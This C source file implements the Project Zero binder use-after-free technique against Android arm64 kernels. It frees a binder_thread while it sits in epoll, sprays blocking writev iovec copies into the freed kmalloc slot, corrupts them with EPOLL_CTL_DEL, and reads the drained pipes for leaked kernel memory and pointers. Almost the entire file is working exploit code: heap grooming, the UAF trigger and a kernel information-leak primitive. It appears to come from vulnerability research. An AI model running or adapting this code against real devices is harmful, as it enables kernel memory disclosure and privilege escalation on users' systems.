/*
 * pipe_readback_test.c — P0-style pipe iovec readback for UAF detection
 *
 * The actual P0 exploitation technique:
 * 1. Free binder_thread → dangling wait_queue in epoll
 * 2. Start blocking writev with iovec → iovec copy lands in freed slot
 * 3. EPOLL_CTL_DEL → list_del corrupts iovec copy at wait_queue offset
 * 4. Drain pipe → writev resumes with corrupted iov_base values
 * 5. Read pipe → if iov_base was corrupted to kernel address, we get kernel data
 *
 * The key: rw_copy_check_uvector validates iov_base ONCE at copy time.
 * After corruption, the already-validated copy is used without re-checking.
 *
 * Detection: We write MARKER bytes via the iovec. If writev uses corrupted
 * iov_base (kernel pointer), the data read from pipe will differ from markers.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o pipe_readback_test pipe_readback_test.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <stdint.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct { signed long protocol_version; })
#define BINDER_WRITE_READ   _IOWR('b', 1, struct binder_write_read)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

#define BC_ENTER_LOOPER _IO('c', 13)

/* Marker byte that we write via iovec */
#define MARKER_BYTE 0xBB

/* WAITQUEUE_OFFSET in binder_thread (confirmed in prior sessions) */
#define WAITQUEUE_OFFSET 0x48

struct writev_args {
    int pipe_wr;
    int pipe_rd;    /* read end — for draining after UAF */
    int n_iovecs;
    volatile int blocked; /* set to 1 when writev is about to block */
    ssize_t result;
    int err;
};

static void *writev_thread(void *arg) {
    struct writev_args *a = arg;

    /* Create iovec array — each entry points to a buffer with MARKER_BYTE */
    char *bufs[64];
    struct iovec *iov = calloc(a->n_iovecs, sizeof(struct iovec));

    for (int i = 0; i < a->n_iovecs; i++) {
        bufs[i] = malloc(32);
        memset(bufs[i], MARKER_BYTE, 32);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = 32;   /* Each entry writes 32 marker bytes */
    }

    a->blocked = 1;  /* Signal that we're about to call writev */

    /* This writev will BLOCK because the pipe is full.
     * The kernel allocates an iovec COPY in kmalloc-N.
     * If this copy lands in the freed binder_thread slot,
     * EPOLL_CTL_DEL will corrupt it via list_del. */
    a->result = writev(a->pipe_wr, iov, a->n_iovecs);
    a->err = errno;

    for (int i = 0; i < a->n_iovecs; i++) free(bufs[i]);
    free(iov);
    return NULL;
}

static void test_pipe_readback(int n_iovecs, int n_threads) {
    int iov_size = n_iovecs * 16;  /* sizeof(struct iovec) on arm64 */
    int cache = iov_size <= 128 ? 128 : iov_size <= 192 ? 192 :
                iov_size <= 256 ? 256 : iov_size <= 512 ? 512 : 1024;

    printf("\n--- Pipe readback: %d iovecs (%d bytes → kmalloc-%d), %d threads ---\n",
           n_iovecs, iov_size, cache, n_threads);

    pid_t pid = fork();
    if (pid < 0) { printf("  fork failed\n"); return; }

    if (pid == 0) {
        /* Pin to CPU 0 for SLUB locality */
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(0, &set);
        sched_setaffinity(0, sizeof(set), &set);

        /* Step 1: Open binder */
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) { printf("  binder open failed\n"); _exit(1); }
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        /* Enter looper (P0 PoC does this) */
        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (unsigned long)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        uint64_t kptr = ((uint64_t *)bmap)[0];
        printf("  binder kptr: 0x%016llx\n", (unsigned long long)kptr);

        /* Step 2: Add to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Step 3: Free binder_thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread FREED\n");

        /* Step 4: Launch blocking writev threads */
        pthread_t *threads = calloc(n_threads, sizeof(pthread_t));
        struct writev_args *args = calloc(n_threads, sizeof(struct writev_args));
        int created = 0;

        for (int i = 0; i < n_threads; i++) {
            int pfd[2];
            if (pipe(pfd) < 0) break;

            /* Fill pipe to near capacity */
            int fl = fcntl(pfd[1], F_GETFL);
            fcntl(pfd[1], F_SETFL, fl | O_NONBLOCK);
            char fill_buf[4096];
            memset(fill_buf, 0x00, sizeof(fill_buf));
            int total_filled = 0;
            while (1) {
                ssize_t w = write(pfd[1], fill_buf, sizeof(fill_buf));
                if (w <= 0) break;
                total_filled += w;
            }
            fcntl(pfd[1], F_SETFL, fl);  /* Remove O_NONBLOCK */

            args[i].pipe_wr = pfd[1];
            args[i].pipe_rd = pfd[0];
            args[i].n_iovecs = n_iovecs;
            args[i].blocked = 0;
            args[i].result = 0;
            args[i].err = 0;

            if (pthread_create(&threads[i], NULL, writev_thread, &args[i]) != 0)
                break;
            created++;

            /* Wait for thread to be about to call writev */
            while (!args[i].blocked) usleep(100);
            /* Give kernel time to allocate iovec copy and block */
            usleep(5000);
        }
        printf("  created %d blocking writev threads\n", created);

        /* Step 5: Trigger EPOLL_CTL_DEL → list_del on freed binder_thread
         * If ANY writev iovec copy landed in the freed slot, list_del will
         * corrupt the iovec at the wait_queue_head offset */
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL done\n");

        /* Step 6: Drain pipes to unblock writev threads */
        printf("  draining pipes...\n");
        int leak_detected = 0;

        for (int i = 0; i < created; i++) {
            /* Read all data from pipe */
            char drain_buf[65536];
            int total_read = 0;

            /* Set pipe read end to non-blocking */
            int fl = fcntl(args[i].pipe_rd, F_GETFL);
            fcntl(args[i].pipe_rd, F_SETFL, fl | O_NONBLOCK);

            /* Read in chunks */
            while (1) {
                ssize_t r = read(args[i].pipe_rd, drain_buf + total_read,
                                sizeof(drain_buf) - total_read);
                if (r <= 0) {
                    if (errno == EAGAIN) {
                        /* Pipe empty, give writev time to write more */
                        usleep(1000);
                        r = read(args[i].pipe_rd, drain_buf + total_read,
                                sizeof(drain_buf) - total_read);
                        if (r <= 0) break;
                    } else break;
                }
                total_read += r;
                if (total_read >= (int)sizeof(drain_buf) - 4096) break;
            }

            /* Wait for writev thread to finish */
            pthread_join(threads[i], NULL);

            /* Check if the WRITEV output contains non-marker bytes */
            /* The first bytes are from the pre-filled pipe (all 0x00) */
            /* The writev data follows — should be all MARKER_BYTE (0xBB) */
            /* If corrupted, some bytes will be from kernel memory */

            /* Find where the writev data starts (after pre-fill zeros) */
            int writev_start = -1;
            for (int j = 0; j < total_read - 1; j++) {
                if ((unsigned char)drain_buf[j] == MARKER_BYTE) {
                    writev_start = j;
                    break;
                }
            }

            if (writev_start >= 0) {
                int writev_len = total_read - writev_start;
                int non_marker = 0;
                int first_diff_offset = -1;
                uint64_t first_diff_val = 0;

                for (int j = writev_start; j < total_read; j++) {
                    if ((unsigned char)drain_buf[j] != MARKER_BYTE) {
                        non_marker++;
                        if (first_diff_offset < 0) {
                            first_diff_offset = j - writev_start;
                            if (j + 8 <= total_read)
                                memcpy(&first_diff_val, &drain_buf[j], 8);
                        }
                    }
                }

                if (non_marker > 0) {
                    leak_detected++;
                    printf("\n  >>> KERNEL DATA LEAK in thread[%d]! <<<\n", i);
                    printf("  writev data: %d bytes starting at offset %d\n",
                           writev_len, writev_start);
                    printf("  non-marker bytes: %d (first at offset +%d)\n",
                           non_marker, first_diff_offset);
                    if (first_diff_val != 0) {
                        printf("  first diff value (8 bytes): 0x%016llx\n",
                               (unsigned long long)first_diff_val);
                        if ((first_diff_val & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL)
                            printf("  >>> KERNEL POINTER DETECTED! <<<\n");
                    }

                    /* Hex dump of first 64 non-marker bytes */
                    printf("  hex dump around first diff:\n  ");
                    int dump_start = writev_start + first_diff_offset;
                    dump_start = dump_start > 8 ? dump_start - 8 : writev_start;
                    for (int j = dump_start; j < dump_start + 64 && j < total_read; j++) {
                        printf("%02x ", (unsigned char)drain_buf[j]);
                        if ((j - dump_start + 1) % 16 == 0) printf("\n  ");
                    }
                    printf("\n");
                } else if (writev_len > 0) {
                    /* Check writev result */
                    if (i == 0 || i == created - 1) {
                        printf("  thread[%d]: writev wrote %zd bytes, all markers (%d bytes read)\n",
                               i, args[i].result, total_read);
                    }
                }
            } else {
                if (i == 0)
                    printf("  thread[%d]: no marker bytes found in %d bytes read (writev=%zd err=%d)\n",
                           i, total_read, args[i].result, args[i].err);
            }

            close(args[i].pipe_rd);
            close(args[i].pipe_wr);
        }

        if (leak_detected)
            printf("\n  >>> %d THREADS SHOWED KERNEL DATA LEAK! <<<\n", leak_detected);
        else
            printf("  no kernel data leaks detected in %d threads\n", created);

        free(threads);
        free(args);
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);
        _exit(leak_detected > 0 ? 42 : 0);
    }

    alarm(30);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42)
            printf("  >>> KERNEL LEAK CONFIRMED! <<<\n");
        else
            printf("  no leak (exit=%d)\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d — possible kernel oops from reclaim\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== PIPE IOVEC READBACK TEST (P0 TECHNIQUE) ===\n");
    printf("uid=%u\n", getuid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    /* Test with various iovec counts targeting different caches:
     * struct iovec on arm64 = { void *iov_base, size_t iov_len } = 16 bytes
     *
     * Binder_thread = 304 bytes → kmalloc-512
     * For kmalloc-512: need 17-32 iovec entries (272-512 bytes)
     *
     * But also test kmalloc-256 in case binder_thread is smaller on this kernel
     * For kmalloc-256: need 9-16 entries (144-256 bytes)
     *
     * UIO_FASTIOV = 8, so we need > 8 entries to force kmalloc
     */

    printf("\n=== kmalloc-512 targets ===\n");
    test_pipe_readback(20, 128);   /* 320 bytes → kmalloc-512 */
    test_pipe_readback(25, 128);   /* 400 bytes → kmalloc-512 */
    test_pipe_readback(32, 128);   /* 512 bytes → kmalloc-512 */

    printf("\n=== kmalloc-256 targets ===\n");
    test_pipe_readback(12, 128);   /* 192 bytes → kmalloc-192 */
    test_pipe_readback(16, 128);   /* 256 bytes → kmalloc-256 */

    printf("\n=== Exact binder_thread size (304 bytes = 19 iovecs) ===\n");
    test_pipe_readback(19, 256);   /* 304 bytes → kmalloc-512 */

    printf("\n=== ALL TESTS COMPLETE ===\n");
    return 0;
}
